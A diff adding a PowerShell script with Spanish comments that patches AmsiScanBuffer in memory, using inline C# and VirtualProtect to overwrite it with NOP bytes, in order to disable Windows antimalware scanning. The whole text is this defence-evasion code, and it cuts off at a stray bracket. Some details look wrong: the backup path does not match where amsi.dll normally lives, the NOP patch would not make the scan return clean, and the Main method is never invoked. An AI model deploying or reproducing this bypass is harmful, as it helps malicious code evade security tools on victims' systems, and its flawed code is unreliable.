@@ -1,0 +1,30 @@
+# realizar una copia de seguridad del archivo amsi.dll original:
+Copy-Item -Path "$env:SystemRoot\System32\WindowsPowerShell\v1.0\amsi.dll" -Destination "$env:SystemRoot\System32\WindowsPowerShell\v1.0\amsi.dll.bak"
+# modificar el valor de ScanBuffer a 0
+$content = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Patch {
+    public static void Main() {
+        IntPtr addr = GetProcAddress(GetModuleHandle("amsi.dll"), "AmsiScanBuffer");
+        UInt32 oldProtect;
+        VirtualProtect(addr, (UIntPtr)5, 0x40, out oldProtect);
+
+        byte[] patch = { 0x90, 0x90, 0x90, 0x90, 0x90 };
+        Marshal.Copy(patch, 0, addr, 5);
+    }
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out UInt32 lpflOldProtect);
+}
+"@
+
+Add-Type -TypeDefinition $content -Language CSharp
+[
